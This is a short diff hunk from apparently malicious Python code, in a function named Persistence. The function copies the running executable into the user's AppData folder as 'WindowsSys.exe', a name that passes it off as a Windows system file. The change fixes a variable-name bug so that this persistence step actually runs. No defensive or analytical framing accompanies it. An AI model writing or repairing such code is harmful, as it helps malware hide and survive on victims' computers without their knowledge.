@@ -49,7 +49,7 @@ def Persistence () :
 
 			Location = os.environ["appdata"] + "\\WindowsSys.exe"
 
-			if not os.path.exists(location) :
+			if not os.path.exists(Location) :
 
 				shutil.copyfile(sys.executable , Location)
 
